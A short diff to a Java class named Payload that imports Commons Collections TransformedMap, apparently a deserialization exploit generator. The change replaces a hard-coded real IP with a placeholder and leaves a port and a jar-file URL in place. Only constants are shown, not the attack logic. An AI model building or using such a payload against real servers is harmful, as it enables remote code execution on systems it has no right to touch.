@@ -22,7 +22,7 @@ import org.apache.commons.collections.map.TransformedMap;
  */
 public class Payload {
 	
-	private static final String HOST_NAME = "113.196.235.148";
+	private static final String HOST_NAME = "xxx.xxx.xxx.xxx";
 	private static final int PORT = 29023;
 	
 	private static final String JAR_FILE_URL = "file:/root/server/gs/example.jar";
